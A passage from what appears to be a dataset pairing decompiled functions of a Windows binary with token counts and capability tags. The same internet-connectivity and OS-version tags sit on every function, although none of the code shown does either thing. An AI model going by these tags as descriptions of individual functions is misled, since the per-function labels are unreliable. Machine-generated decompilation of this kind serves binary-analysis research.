        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041ee88(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa8;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (in_DL != '\\0') {\n        puStack72 = 0x41eeab;\n        in_EAX = fcn.00403b58();\n        in_DL = extraout_DL;\n    }\n    uStack76 = 0x41efb1;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1h._0_1_ = in_DL;\n    if (arg_ch == -1) {\n        puStack72 = &fcn.0041ee88::var_1h + 1;\n        fcn.00409028();\n        fcn.0041ed80();\n        if (*(in_EAX + 4) < 0) {\n            fcn.004091d0();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError();\n            fcn.0040c094();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            in_stack_ffffffa8 = 1;\n            fcn.0040c9d4(1, &fcn.0041ee88::var_14h);\n            fcn.00403fc0();\n        }\n    }\n    else {\n        puStack72 = &fcn.0041ee88::var_1h + 1;\n        fcn.00408fac();\n        fcn.0041ed80();\n        if (*(in_EAX + 4) < 0) {\n            fcn.004091d0();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError();\n            fcn.0040c094();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            in_stack_ffffffa8 = 1;\n            fcn.0040c9d4(1, &fcn.0041ee88::var_14h);\n            fcn.00403fc0();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffa8;\n    uStack80 = 0x41efb8;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 660
    },
    "0041f554": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0041f554(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char *pcStack12;\n    \n    uVar1 = 0;\n    for (pcStack12 = *(in_EAX + 0x14); (*pcStack12 != '\\0' && (*pcStack12 != '.')); pcStack12 = pcStack12 + 1) {\n    }\n    if (*pcStack12 != '\\0') {\n        fcn.004046b8();\n        uVar1 = fcn.00404b28();\n        uVar1 = CONCAT31(uVar1 >> 8, 1);\n    }\n    return CONCAT44(pcStack12, uVar1);\n}\n",
        "token_count": 154
    },
    "0041f644": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f644(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x41f6ff;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    var_ch = param_2;\n    if (param_2 != NULL) {\n        while (*var_ch != '\\0') {\n            for (; (*var_ch != '\\0' && (1 < *var_ch - 0x2dU)); var_ch = var_ch + 1) {\n            }\n            fcn.004046b8();\n            iVar2 = fcn.00422c44();\n            if ((iVar2 == 0) && (cVar1 = fcn.004089f4(),  cVar1 != '\\0')) {\n                iVar2 = in_EAX;\n            }\n            if (iVar2 == 0) break;\n            if (*var_ch == '.') {\n                var_ch = var_ch + 1;\n            }\n            if (*var_ch == '-') {\n                var_ch = var_ch + 1;\n            }\n            in_EAX = iVar2;\n            if (*var_ch == '>') {\n                var_ch = var_ch + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41f706;\n    uStack40 = 0x41f6fe;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 405
    },
    "0041f7a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f7a0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x41f7b3;\n    (**(**0x48584c + 0x14))();\n    uStack40 = 0x41f93d;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41f7cb;\n    puStack36 = &stack0xfffffffc;\n    iVar1 = fcn.0041c8b0();\n    uStack52 = 0x41f91e;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if (*(iVar1 + 8) < 1) {\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x41f925;\n        uStack52 = 0x41f91d;\n        fcn.0041c914();\n        return;\n    }\n    puStack60 = 0x41f7f1;\n    puStack48 = &stack0xfffffffc;\n    fcn.004037f0();\n    uStack64 = 0x41f8ff;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41f80e;\n    puStack60 = &stack0xfffffffc;\n    fcn.004037f0();\n    uStack76 = 0x41f8ad;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    iVar5 = 0;\n    puStack72 = &stack0xfffffffc;\n    do {\n        while( true ) {\n            if (*(iVar1 + 8) <= iVar5) {\n                *in_FS_OFFSET = uStack80;\n                puStack72 = 0x41f8b4;\n                uStack76 = 0x41f8ac;\n                fcn.00403820();\n                return;\n            }\n            puVar2 = fcn.0041c4c8();\n            iVar3 = fcn.0041c000();\n            if (iVar3 == 0) break;\ncode_r0x0041f84e:\n            if (iVar3 != 0) {\n                fcn.0041f644();\n                (***puVar2)();\n            }\n            fcn.0041f720(&stack0xfffffffc);\n            fcn.0041c3a4();\n            fcn.00403820();\n        }\n        iVar4 = fcn.0041863c();\n        if (iVar4 != 0) goto code_r0x0041f84e;\n        fcn.0041f758(&stack0xfffffffc);\n        iVar5 = iVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 764
    },
    "0041f94c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f94c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x485868 == 0) {\n        return;\n    }\n    puStack28 = 0x41f972;\n    iVar2 = fcn.0041c8b0();\n    uStack32 = 0x41f9e7;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(iVar2 + 8) + -1;\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            iVar3 = fcn.0041c4c8();\n            if ((in_EAX == 0) || (*(iVar3 + 8) == in_EAX)) {\n                if (param_2 != 0) {\n                    cVar1 = fcn.004089f4();\n                    if (cVar1 == '\\0') goto code_r0x0041f9c9;\n                }\n                fcn.0041c3a4();\n                fcn.00403820();\n            }\ncode_r0x0041f9c9:\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41f9ee;\n    uStack32 = 0x41f9e6;\n    fcn.0041c914();\n    return;\n}\n",
        "token_count": 401
    },
    "0041f9f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f9f8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    if (*0x485868 != 0) {\n        puStack24 = 0x41fa15;\n        iVar1 = fcn.0041c8b0();\n        uStack28 = 0x41fa6f;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack24 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.0041c4c8();\n                if (*(iVar2 + 4) == in_EAX) {\n                    fcn.0041c3a4();\n                    fcn.00403820();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41fa76;\n        uStack28 = 0x41fa6e;\n        fcn.0041c914();\n        return;\n    }\n    return;\n}\n",
        "token_count": 307
    },
    "0041fb44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fb44(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.004089f4();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        (*arg_10h)();\n        fcn.004045c8();\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "0041fb78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fb78(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x41fb91;\n    cVar1 = fcn.004089f4();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        puStack24 = 0x41fbac;\n        cVar1 = fcn.00421a0c();\n        if (cVar1 != '\\n') {\n            *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n            puStack24 = 0x41fbbe;\n            fcn.00421b1c();\n            *(in_EAX + 0x78) = 1;\n            puStack24 = 0x41fbca;\n            fcn.0041fa94();\n        }\n        puStack24 = 0x41fbd6;\n        piVar2 = fcn.004037f0();\n        uStack28 = 0x41fc39;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.0041ffb8();\n        (**(*piVar2 + 4))();\n        fcn.0041ffb8();\n        *(in_EAX + 0x78) = 1;\n        (*arg_10h)();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41fc40;\n        uStack28 = 0x41fc38;\n        fcn.00403820();\n        return;\n    }\n    return;\n}\n",
        "token_count": 454
    },
    "0041fcf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041fcf0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x41fd02;\n    iVar1 = fcn.0041c8b0();\n    uStack24 = 0x41fd60;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.0041c4c8();\n            if ((*(iVar2 + 4) == *(in_EAX + 4)) && (*(iVar2 + 0xc) == *(in_EAX + 0xc))) {\n                fcn.00403820();\n                fcn.0041c3a4();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41fd67;\n    uStack24 = 0x41fd5f;\n    fcn.0041c914();\n    return;\n}\n",
        "token_count": 305
    },
    "0041fd6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041fd6c(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    uStack36 = 0x41fe7a;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar5 = in_EAX[0xc];\n    if (iVar5 != 0) {\n        uStack48 = 0x41fe5d;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        iVar5 = *(iVar5 + 8);\n        puVar1 = &stack0xfffffffc;\n        if (-1 < iVar5 + -1) {\n            do {\n                puStack32 = puVar1;\n                puVar3 = fcn.0041c4c8();\n                fcn.00404660();\n                (**(*in_EAX + 0x20))();\n                iVar4 = fcn.0041f644();\n                fcn.0041c4c8();\n                fcn.0041fcf0();\n                if ((iVar4 == 0) && (cVar2 = fcn.0041f554(),  cVar2 != '\\0')) {\n                    fcn.0041c4c8();\n                    fcn.0041c828();\n                    fcn.0041c62c();\n                }\n                else {\n                    (***puVar3)();\n                }\n                iVar5 = iVar5 + -1;\n                puVar1 = puStack32;\n            } while (iVar5 != 0);\n        }\n        *in_FS_OFFSET = uStack52;\n        puStack44 = 0x41fe64;\n        uStack48 = 0x41fe5c;\n        fcn.0041feac();\n        return;\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41fe81;\n    uStack36 = 0x41fe79;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 553
    },
    "0041fee8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0041fee8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    iVar2 = fcn.00403764();\n    do {\n        if (iVar2 == *0x419ed8) {\n            if (*(in_EAX + 0x74) == 0) {\n                uVar4 = fcn.0041bbc0();\n            }\n            else {\n                uVar4 = fcn.0041bac0();\n            }\n            return uVar4;\n        }\n        piVar3 = fcn.0041bb48();\n        if ((piVar3 != NULL) && (iVar2 = *piVar3,  -1 < iVar2 + -1)) {\n            iVar5 = 0;\n            do {\n                uVar4 = **(piVar3 + iVar5 * 2 + 1);\n                cVar1 = fcn.00403784();\n                if (cVar1 != '\\0') {\n                    return uVar4;\n                }\n                iVar5 = iVar5 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iVar2 = fcn.004037ac();\n    } while( true );\n}\n",
        "token_count": 296
    },
    "00420230": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nvoid __cdecl fcn.00420230(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    char in_DL;\n    int32_t iVar3;\n    uint var_3h;\n    \n    iVar2 = fcn.0040583c();\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        do {\n            if (in_DL == '\\0') {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = ~in_AX & *(iVar1 + 0x1c);\n            }\n            else {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = *(iVar1 + 0x1c) | in_AX;\n            }\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "00420318": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420318(int32_t arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4203fe;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x42033d;\n    iVar2 = fcn.00421ea0();\n    *(arg_8h + -0x14) = 0;\n    if (*(*(arg_8h + -8) + 0x6a) != 0) {\n        puStack32 = arg_8h + -0x14;\n        uStack36 = 0x42036f;\n        (**(*(arg_8h + -8) + 0x68))();\n    }\n    if (*(arg_8h + -0x14) == 0) {\n        puStack32 = 0x42037d;\n        uVar3 = (**(iVar2 + -0xc))();\n        *(arg_8h + -0x14) = uVar3;\n        if ((*(arg_8h + -9) & 4) != 0) {\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 1;\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 0x200;\n        }\n        uStack36 = 0x4203d2;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        (**(**(arg_8h + -0x14) + 0x2c))();\n        *in_FS_OFFSET = uStack40;\n    }\n    puVar1 = *(arg_8h + -0x14) + 0x1c;\n    *puVar1 = *puVar1 | 1;\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 537
    },
    "004207a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004207a8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) == 0) {\n        puStack16 = 0x4207c7;\n        uVar1 = fcn.004037f0();\n        *(in_EAX + 0x30) = uVar1;\n        uStack20 = 0x420803;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        fcn.00420818();\n        fcn.0041fd6c();\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x420814;\n        uStack20 = 0x420802;\n        fcn.0041feac();\n        return;\n    }\n    puStack16 = 0x420814;\n    fcn.00420818();\n    return;\n}\n",
        "token_count": 251
    },
    "00420c04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00420c04(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    int32_t var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    puStack304 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack308 = 0x420cf5;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack312;\n    fcn.004045c8();\n    cVar1 = fcn.004039b8();\n    if (cVar1 != '\\0') {\n        fcn.00404660();\n    }\n    if (var_4h == 0) {\n        fcn.00403770();\n        fcn.0040482c();\n    }\n    var_124h = var_4h;\n    var_120h._0_1_ = 0xb;\n    var_11ch = **0x4844a0;\n    var_118h._0_1_ = 0xb;\n    var_114h = *(arg_8h + -8);\n    var_110h._0_1_ = 0xb;\n    var_10ch = *(in_EAX + 4);\n    var_108h._0_1_ = 0xb;\n    uVar2 = 3;\n    fcn.0040c9d4(3, &var_124h);\n    fcn.00403fc0();\n    *in_FS_OFFSET = uVar2;\n    uStack312 = 0x420cfc;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 463
    },
    "00420d20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420d20(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack56 = &stack0xfffffffc;\n    uStack48 = 0x420ef6;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x420eab;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = 0x420d5b;\n    fcn.00421830();\n    uStack72 = 0x420e84;\n    iStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar4 = 1;\n    puStack68 = &stack0xfffffffc;\n    iVar2 = fcn.00404888();\n    *(in_EAX + 0x78) = 1;\n    var_14h = param_2;\n    while( true ) {\n        for (; (iVar4 <= iVar2 && (*(iVar4 + -1) != '.')); iVar4 = iVar4 + 1) {\n        }\n        iStack76 = in_EAX + 0x70;\n        fcn.00404ae8();\n        if (iVar2 < iVar4) break;\n        fcn.00403a6c();\n        puVar3 = fcn.00418524();\n        if (puVar3 == NULL) {\n            fcn.0041ffa4();\n        }\n        var_14h = NULL;\n        if (***puVar3 == '\\a') {\n            var_14h = fcn.0041863c();\n        }\n        cVar1 = fcn.004039b8();\n        if (cVar1 == '\\0') {\n            fcn.00420d04(&stack0xfffffffc);\n        }\n        iVar4 = iVar4 + 1;\n    }\n    fcn.00403a6c();\n    iVar2 = fcn.00418524();\n    if (iVar2 == 0) {\n        *(in_EAX + 0x78) = 0;\n        (**(*var_14h + 4))();\n        *(in_EAX + 0x78) = 1;\n        if (*(in_EAX + 0x70) != 0) {\n            fcn.0041ffa4();\n        }\n    }\n    else {\n        fcn.004210a8();\n    }\n    *in_FS_OFFSET = iStack76;\n    *in_FS_OFFSET = iStack64;\n    *in_FS_OFFSET = iStack52;\n    puStack44 = 0x420efd;\n    uStack48 = 0x420ef5;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 763
    },
    "004210a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004210a8(uint *param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    unkbyte10 Var4;\n    ulong uVar5;\n    uint in_stack_ffffffb4;\n    uchar uVar6;\n    uchar uVar7;\n    ushort uVar8;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uVar6 = 0xfc;\n    uStack64 = 0x4213b1;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puVar1 = &stack0xfffffffc;\n    if (param_1[2] == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (***param_1 == '\\a') {\n            fcn.0041863c();\n            cVar2 = fcn.004039b8();\n            puVar1 = puStack60;\n            if ((cVar2 != '\\0') && (iVar3 = fcn.0041863c(),  puVar1 = puStack60,  (*(iVar3 + 0x24) & 4) != 0))\n            goto code_r0x00421124;\n        }\n        puStack60 = puVar1;\n        fcn.0041fa7c();\n        puVar1 = puStack60;\n    }\ncode_r0x00421124:\n    puStack60 = puVar1;\n    // switch table (17 cases) at 0x421144\n    switch(***param_1) {\n    case 1:\n        cVar2 = fcn.0041ff94();\n        if (cVar2 == '\\a') {\n            fcn.00420a04();\n            fcn.00420f04();\n        }\n        else {\n            fcn.00420b04();\n            fcn.004186b0();\n        }\n        break;\n    case 2:\n        fcn.00420054();\n        fcn.004186b0();\n        break;\n    case 3:\n        fcn.00420a04();\n        fcn.004184c0();\n        fcn.004186b0();\n        break;\n    case 4:\n        uVar8 = 0x42;\n        Var4 = fcn.004208e8();\n        in_stack_ffffffb4 = Var4 >> 0x20;\n        fcn.00418f6c(Var4, in_stack_ffffffb4, CONCAT22(uVar8, Var4 >> 0x40));\n        break;\n    case 5:\n    case 10:\n        fcn.0042186c();\n        fcn.00418c50();\n        break;\n    case 6:\n        fcn.0042174c();\n        fcn.004186b0();\n        break;\n    case 7:\n        cVar2 = fcn.0041ff94();\n        if (cVar2 == '\\r') {\n            fcn.00421a0c();\n            fcn.004186b0();\n        }\n        else if (cVar2 == '\\x0e') {\n            fcn.00421a0c();\n            fcn.0041863c();\n            fcn.004200ac();\n        }\n        else {\n            uVar7 = &stack0xfffffffc >> 8;\n            uVar8 = &stack0xfffffffc >> 0x10;\n            fcn.00420a04();\n            in_stack_ffffffb4 = 0x4212f0;\n            fcn.00420f4c(CONCAT22(uVar8, CONCAT11(uVar7, uVar6)));\n        }\n        break;\n    case 8:\n        cVar2 = fcn.0041ff94();\n        if (cVar2 == '\\r') {\n            fcn.00421a0c();\n            fcn.0041920c();\n        }\n        else {\n            fcn.00420a04();\n            iVar3 = (**(*in_EAX + 0x18))();\n            if (iVar3 != 0) {\n                fcn.0041920c();\n            }\n        }\n        break;\n    case 0xb:\n        fcn.00421928();\n        fcn.00418d64();\n        break;\n    case 0xc:\n        in_stack_ffffffb4 = 0x421360;\n        fcn.00420f8c(&stack0xfffffffc);\n        break;\n    case 0xf:\n        in_stack_ffffffb4 = 0x421380;\n        